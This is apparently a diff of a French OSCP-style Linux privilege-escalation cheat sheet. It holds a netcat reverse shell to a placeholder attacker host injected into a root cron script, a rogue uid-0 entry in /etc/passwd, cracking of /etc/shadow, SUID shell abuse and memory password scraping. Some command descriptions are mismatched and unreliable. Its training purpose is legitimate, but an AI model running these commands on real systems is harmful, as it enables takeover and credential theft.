@@ -7,12 +7,9 @@ description: "Examiner les permissions, processus et configurations d'un systèm
 
 Examiner les permissions, processus et configurations d'un système Linux.
 
-
 ## Énumération
 
-
 **Utilisateur actuel**
-
 
 <p class="oscp-command-note">Afficher l&#x27;identité Unix et les groupes.</p>
 
@@ -21,9 +18,7 @@ id
 
 ```
 
-
 **Nom de la machine**
-
 
 <p class="oscp-command-note">Afficher le nom de la machine.</p>
 
@@ -32,9 +27,7 @@ hostname
 
 ```
 
-
 **Version du système et architecture**
-
 
 <p class="oscp-command-note">Lire le fichier /etc/issue et examiner son contenu.</p>
 
@@ -43,12 +36,10 @@ cat /etc/issue
 
 ```
 
-
 ```text
 cat /etc/os-release
 
 ```
-
 
 <p class="oscp-command-note">Afficher le système et la version du noyau.</p>
 
@@ -57,9 +48,7 @@ uname -a
 
 ```
 
-
 **Processus en cours**
-
 
 <p class="oscp-command-note">Afficher les processus actifs.</p>
 
@@ -68,9 +57,7 @@ ps aux
 
 ```
 
-
 **Interfaces réseau, itinéraires, connexions, ports ouverts**
-
 
 <p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
 
@@ -79,17 +66,12 @@ ip a
 
 ```
 
-
-
-
 ```text
 ss -anp
 
 ```
 
-
 **Règles du pare-feu**
-
 
 <p class="oscp-command-note">Lire le fichier /etc/iptables/rules.v4 et examiner son contenu.</p>
 
@@ -98,9 +80,7 @@ cat /etc/iptables/rules.v4
 
 ```
 
-
 **Tâches cron planifiées**
-
 
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Énumération».</p>
 
@@ -109,14 +89,10 @@ ls -lah /etc/cron*
 
 ```
 
-
-
-
 ```text
 crontab -l
 
 ```
-
 
 ```bash
 # Examiner les tâches cron
@@ -124,9 +100,7 @@ sudo crontab -l
 
 ```
 
-
 **Logiciels installés**
-
 
 <p class="oscp-command-note">Syntaxe ou résultat illustratif pour «Énumération» (ne pas exécuter comme une commande).</p>
 
@@ -135,13 +109,10 @@ dpkg -l
 
 ```
 
-
 **Paramètres et repères :**
 `/dev/null`  
 
-
 **Fichiers sensibles modifiables (hors /dev/null)**
-
 
 <p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
@@ -150,9 +121,7 @@ find / -writable -type d 2>/dev/null
 
 ```
 
-
 **Mots de passe présents en mémoire**
-
 
 <p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>
 
@@ -161,20 +130,14 @@ strings /dev/mem -n10 | grep -i PASS
 
 ```
 
-
 **Trouver des fichiers sensibles**
-
-
-
 
 ```text
 locate password | more
 
 ```
 
-
 **Volumes montés**
-
 
 <p class="oscp-command-note">Lire le fichier /etc/fstab et examiner son contenu.</p>
 
@@ -183,44 +146,29 @@ cat /etc/fstab
 
 ```
 
-
-
-
 ```text
 mount
 
 ```
-
-
-
 
 ```text
 lsblk
 
 ```
 
-
 **Pilotes et modules du noyau**
-
-
-
 
 ```text
 lsmod
 
 ```
 
-
-
-
 ```text
 /sbin/modinfo <driver_name>
 
 ```
 
-
 **Binaires SUID**
-
 
 <p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
@@ -229,30 +177,20 @@ find / -perm -u=s -type f 2>/dev/null
 
 ```
 
-
-
-
 ```bash
 sudo -l
 
 ```
-
-
-
 
 ```bash
 sudo -i
 
 ```
 
-
 **Paramètres et repères :**
 `unix-privesc-check`  
 
-
 **Énumération automatisée**
-
-
 
 ### Interfaces et connexions
 
@@ -290,27 +228,19 @@ ps axjf
 
 ## Examiner les services
 
-
-
-
 ```bash
 watch -n 1 "ps -aux | grep pass"
 
 ```
 
-
 **Paramètres et repères :**
 `tcpdump`  
-
-
-
 
 ```bash
 # Capturer le trafic réseau
 sudo tcpdump -i lo -A | grep "pass"
 
 ```
-
 
 ```bash
 # Capturer le trafic réseau
@@ -320,11 +250,9 @@ tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
 
 ```
 
-
 ## Tâches cron
 
 Examiner les permissions et la configuration de Linux.
-
 
 <p class="oscp-command-note">Rechercher les événements cron dans les journaux système.</p>
 
@@ -335,7 +263,6 @@ cat /var/log/cron.log
 
 ```
 
-
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Tâches cron».</p>
 
 ```bash
@@ -343,14 +270,12 @@ ls -lah /path/to/script.sh
 
 ```
 
-
 <p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
 ```bash
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh
 
 ```
-
 
 <p class="oscp-command-note">Cron : afficher les tâches de l'utilisateur et examiner les répertoires de planification.</p>
 
@@ -370,9 +295,7 @@ cat /var/spool/cron/crontabs/root
 
 ```
 
-
 ### /etc/passwd
-
 
 <p class="oscp-command-note">Examiner une connexion TLS ou un certificat.</p>
 
@@ -381,19 +304,14 @@ openssl passwd Password123
 
 ```
 
-
 **Paramètres et repères :**
 `/etc/passwd`  
-
-
-
 
 ```bash
 # Ce n'est qu'un exemple en utilisant la sortie de la commande précédente.
 echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd
 
 ```
-
 
 <p class="oscp-command-note">Linux : vérifier la connexion au compte de test, puis afficher ses groupes et son UID.</p>
 
@@ -405,9 +323,7 @@ id
 
 ```
 
-
 ### /etc/shadow
-
 
 <p class="oscp-command-note">Lire le fichier /etc/shadow et examiner son contenu.</p>
 
@@ -415,7 +331,6 @@ id
 cat /etc/shadow | grep [root_user] > [root_user]_hash.txt
 
 ```
-
 
 <p class="oscp-command-note">Analyser des empreintes avec John.</p>
 
@@ -428,7 +343,6 @@ hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt
 
 ```
 
-
 ```bash
 # Avec John the Ripper
 john --show [root_user]_hash.txt
@@ -438,9 +352,7 @@ hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show
 
 ```
 
-
 ### Binaires SUID
-
 
 <p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
@@ -449,7 +361,6 @@ find / -perm -4000 -type f 2>/dev/null
 
 ```
 
-
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Binaires SUID».</p>
 
 ```bash
@@ -457,9 +368,7 @@ ls -l $(find / -perm -4000 -type f 2>/dev/null)
 
 ```
 
-
 ### Exploitation des binaires setuid
-
 
 <p class="oscp-command-note">Afficher les processus actifs.</p>
 
@@ -468,7 +377,6 @@ ps u -C [binary_name]
 
 ```
 
-
 <p class="oscp-command-note">Lire le fichier /proc/[PID]/status et examiner son contenu.</p>
 
 ```bash
@@ -476,10 +384,8 @@ cat /proc/[PID]/status | grep Uid
 
 ```
 
-
 **Paramètres et repères :**
 `find`  
-
 
 <p class="oscp-command-note">Localiser les fichiers correspondant aux critères indiqués.</p>
 
@@ -488,24 +394,18 @@ find [directory] -exec [path_to_shell] \;
 
 ```
 
-
 ```bash
 # Remplacer [vulnerable_binary] par le nom du binaire que vous ciblez.
 find / -name [vulnerable_binary] -exec /bin/bash -p \;
 
 ```
 
-
 ### Capacités Linux (Capabilities)
-
-
-
 
 ```bash
 /usr/sbin/getcap -r / 2>/dev/null
 
 ```
-
 
 <p class="oscp-command-note">Examiner ou modifier les permissions selon «Capacités Linux (Capabilities)».</p>
 
@@ -517,9 +417,6 @@ getcap /usr/bin/nmap
 
 ```
 
-
-
-
 ```bash
 setcap [capabilities] [binary_path]
 
@@ -527,7 +424,6 @@ setcap [capabilities] [binary_path]
 setcap cap_dac_override=eip /path/to/binary
 
 ```
-
 
 ```bash
 setcap -r [binary_path]
@@ -537,61 +433,43 @@ setcap -r /usr/bin/nmap
 
 ```
 
-
 ### Capacités et permissions Linux
-
 
 **CAP_AUDIT_CONTROL**
 
 Allows enabling or disabling kernel auditing. · Can be used to disable auditing mechanisms and evade detection.
 
-
 **CAP_AUDIT_WRITE**
 
 Allows writing records to the kernel auditing log. · Can be used to manipulate or inject log entries, potentially covering up malicious activities.
 
-
 **CAP_BLOCK_SUSPEND**
-
 
 **CAP_CHOWN**
 
-
 **CAP_DAC_OVERRIDE**
-
 
 **CAP_DAC_READ_SEARCH**
 
 Bypasses file and directory read and execute permission checks. · Allows reading and searching files and directories that would normally be restricted.
 
-
 **CAP_FOWNER**
-
 
 **CAP_IPC_LOCK**
 
-
 **CAP_KILL**
-
 
 **CAP_MAC_ADMIN**
 
-
 **CAP_NET_BIND_SERVICE**
-
 
 **CAP_NET_RAW**
 
-
 **CAP_SETGID**
-
 
 **CAP_SETPCAP**
 
-
 **CAP_SETUID**
-
-
 
 ### Cron et minuteurs systemd
 
@@ -608,14 +486,10 @@ systemctl list-timers --all
 
 Examiner les permissions et la configuration de Linux.
 
-
-
-
 ```bash
 sudo -l
 
 ```
-
 
 <p class="oscp-command-note">Filtrer les journaux système par nom de processus.</p>
 
@@ -624,85 +498,66 @@ grep [process_name] /var/log/syslog
 
 ```
 
-
 ## Vulnérabilités du noyau
-
 
 **CVE-2010-3904**
 
 RDS · Linux Kernel <= 2.6.36-rc8 · Exploit
 
-
 **CVE-2010-4258**
 
 Full Nelson · Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) · Exploit
-
 
 **CVE-2012-0056**
 
 Mempodipper · Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) · Exploit
 
-
 **CVE-2016-5195**
 
 DirtyCow · Linux Kernel <= 3.19.0-73.8 · Exploit 1 Exploit 2
-
 
 **CVE-2016-5696**
 
 TCP Remote Code Execution · Linux Kernel 3.6 - 4.7 · Exploit
 
-
 **CVE-2017-8890**
 
 Race Condition in Linux Kernel · Linux Kernel < 4.11.6 · Exploit
-
 
 **CVE-2018-8897**
 
 Insecure Use of a Memory Barrier · Linux Kernel 3.14 - 4.15 · Exploit
 
-
 **CVE-2019-7304**
 
 Race Condition in OverlayFS · Linux Kernel 4.10 - 4.15 · Exploit
-
 
 **CVE-2021-4034**
 
 PwnKit · Linux Kernel 4.4 - 5.8 · Exploit
 
-
 **CVE-2020-14386**
 
 Privilege Escalation via OverlayFS · Linux Kernel 4.8 - 5.7 · Exploit
-
 
 **CVE-2021-3156**
 
 Sudo Privilege Escalation · Sudo versions < 1.9.5p2 · Exploit
 
-
 **CVE-2021-33034**
 
 Privilege Escalation via the Kernel · Linux Kernel 5.4 - 5.10.4 · Exploit
-
 
 **CVE-2022-0847**
 
 DirtyPipe · Linux Kernel 5.8 < 5.16.11 · Exploit
 
-
 ## Exploitation des caractères génériques (Wildcards)
-
-
-
 
 <p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>*</code></p>
 <p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>?</code></p>
 <p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>[]</code></p>
 ### Exploitation des caractères génériques dans les commandes
-
 
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Exploitation des caractères génériques dans les commandes».</p>
 
@@ -711,26 +566,18 @@ ls /var/log/*
 
 ```
 
-
-
-
 ```bash
 # Exemple de script vulnérable
 tar -cvf archive.tar.gz /var/log/*
 
 ```
 
-
 ### Exploitation des caractères génériques dans les opérations sur les fichiers
-
-
-
 
 ```bash
 touch /tmp/file_*
 
 ```
-
 
 <p class="oscp-command-note">Copier les fichiers indiqués.</p>
 
@@ -739,8 +586,6 @@ touch /tmp/file_*
 cp /etc/* /tmp/backup/
 
 ```
-
-
 
 #### Observer l'expansion du shell
 
@@ -754,9 +599,6 @@ printf '%s\n' ./*
 
 ## Permissions du groupe disk
 
-
-
-
 ```text
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -767,11 +609,9 @@ debugfs: cat /etc/shadow
 
 ```
 
-
 ## Élévation de privilèges via MySQL
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
-
 
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
 
@@ -781,9 +621,7 @@ select sys_eval('whoami');
 
 ```
 
-
 ## Logiciels installés par l’utilisateur
-
 
 <p class="oscp-command-note">Chemins de fichiers à examiner pour «Logiciels installés par l’utilisateur» (pas des commandes).</p>
 
@@ -797,7 +635,6 @@ select sys_eval('whoami');
 /usr/src/
 
 ```
-
 
 <p class="oscp-command-note">Inventorier les logiciels installés via dpkg sur Debian ou rpm sur Fedora/RHEL.</p>
 
@@ -813,15 +650,12 @@ pkg_info
 
 ```
 
-
 ## Mots de passe faibles, réutilisés ou en clair
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
-
 **Paramètres et repères :**
 `config.php`  
-
 
 <p class="oscp-command-note">Exemples de couples compte/mot de passe faibles à examiner (pas des commandes).</p>
 
@@ -836,9 +670,6 @@ username:password
 
 ```
 
-
-
-
 ```bash
 # Anything interesting in the mail folder?
 /var/mail
@@ -846,17 +677,12 @@ username:password
 
 ```
 
-
-
-
 ```bash
 ./LinEnum.sh -t -k password
 
 ```
 
-
 ### Connexions réseau actives
-
 
 <p class="oscp-command-note">Examiner les ports et connexions réseau.</p>
 
@@ -866,8 +692,6 @@ netstat -anlp
 netstat -ano
 
 ```
-
-
 
 ### Localiser les coffres KeePass
 
@@ -891,7 +715,6 @@ find /home -type d -name '.ssh' 2>/dev/null
 
 ## Scripts modifiables par tous et exécutés par root
 
-
 <p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
 ```bash
@@ -908,11 +731,7 @@ find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
 
 ```
 
-
 ## Systèmes de fichiers non montés
-
-
-
 
 ```bash
 mount -l
@@ -920,21 +739,17 @@ cat /etc/fstab
 
 ```
 
-
 ## Fichiers SUID et SGID
 
 Examiner les permissions et la configuration de Linux.
-
 
 ### Comprendre les permissions SUID et SGID
 
 Examiner les permissions et la configuration de Linux.
 
-
 ### Rechercher les fichiers SUID et SGID
 
 Examiner les permissions et la configuration de Linux.
-
 
 <p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
@@ -947,9 +762,7 @@ find / -perm -g=s -type f 2>/dev/null
 
 ```
 
-
 ### Évaluer les possibilités d’exploitation
-
 
 <p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>
 
@@ -973,7 +786,6 @@ export PATH=/tmp:$PATH
 
 ```
 
-
 <p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
 ```bash
@@ -984,14 +796,11 @@ find / -perm -u=s -writable -type f 2>/dev/null
 
 ```
 
-
 ```bash
 # Trouver des scripts dans cronjobs ou répertoires système qui peuvent avoir SUID ou GUID ensemble
 find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null
 
 ```
-
-
 
 #### Lire les dépendances ELF
 
@@ -1002,7 +811,6 @@ Identifier les bibliothèques déclarées dans un exécutable sans exécuter le 
 ```bash
 readelf -d <BINAIRE_ELF> | grep NEEDED
 ```
-
 
 #### Observer les accès aux fichiers d'un programme
 
@@ -1026,18 +834,13 @@ strings <BINAIRE_SUID> | grep -Ei '(/bin/|/usr/|system|exec|sh )'
 
 ### LinPEAS
 
-
 **Paramètres et repères :**
 `./linpeas.sh`  
-
-
-
 
 ```bash
 ./linpeas.sh | tee linpeas_output.txt
 
 ```
-
 
 <p class="oscp-command-note">Convertir les résultats PEAS en fichiers JSON ou HTML.</p>
 
@@ -1055,9 +858,7 @@ python3 json2pdf.py peass.json peass.pdf
 
 ```
 
-
 ### LinEnum
-
 
 <p class="oscp-command-note">LinEnum : lancer l'inventaire standard ou une recherche approfondie par mot-clé.</p>
 
@@ -1069,52 +870,36 @@ python3 json2pdf.py peass.json peass.pdf
 
 ```
 
-
 ```bash
 ./LinEnum.sh | tee linenum_output.txt
 
 ```
 
-
 ### Unix-privesc-check
-
 
 **Paramètres et repères :**
 `./unix-privesc-check.sh`  
-
-
-
 
 ```bash
 ./unix-privesc-check.sh | tee unix_privesc_check_output.txt
 
 ```
 
-
 ### Checksec
-
-
-
 
 ```bash
 checksec --all
 
 ```
 
-
 ### Peepdf
-
-
-
 
 ```bash
 peepdf.py file.pdf
 
 ```
 
-
 ### Outil de recherche de vulnérabilités
-
 
 <p class="oscp-command-note">Exécuter exploit-suggester.py avec les paramètres indiqués pour «Outil de recherche de vulnérabilités».</p>
 
@@ -1122,7 +907,6 @@ peepdf.py file.pdf
 python3 exploit-suggester.py
 
 ```
-
 
 ## Permissions et traces utiles sur Linux
 
